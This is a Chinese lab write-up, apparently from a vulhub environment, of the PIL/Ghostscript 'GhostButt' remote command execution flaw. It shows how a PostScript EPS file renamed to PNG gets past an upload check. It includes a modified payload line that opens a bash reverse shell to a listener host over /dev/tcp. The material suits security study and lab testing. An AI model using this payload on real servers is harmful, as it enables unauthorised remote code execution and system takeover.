# Python PIL 远程命令执行漏洞（GhostButt ）

## 漏洞测试

运行环境：

```plain
docker compose up -d
```

运行后，访问http://your-ip:8000/即可看到一个上传页面。正常功能是我们上传一个PNG文件，后端调用PIL加载图片，输出长宽。但我们可以将可执行命令EPS文件后缀改成PNG进行上传，因为后端是根据文件头来判断图片类型，所以无视后缀检查。

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780897797800-7cf381a5-5ab0-451f-8f6e-e0f109c477b4.png)

比如[poc.png](https://github.com/vulhub/vulhub/blob/master/python/PIL-CVE-2017-8291/poc.png#tdsub)，我们上传之，即可执行touch /tmp/aaaaa。将POC中的命令改为反弹命令，即可获得shell：



![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780897797801-bc84447d-8302-47de-a1eb-990e25d18fd0.png)![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780897798080-8a1b6931-7665-4094-ad04-715655d634da.png)

将touch /tmp/awesome_poc命令改为反弹shell命令：

```plain
currentdevice null false mark /OutputFile (%pipe%bash -c "bash -i >& /dev/tcp/192.168.174.128/9999 0>&1")
```

成功接收反弹shell：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780897798336-7a0ea3a5-0fca-4d78-af9e-e55b0f96229d.png)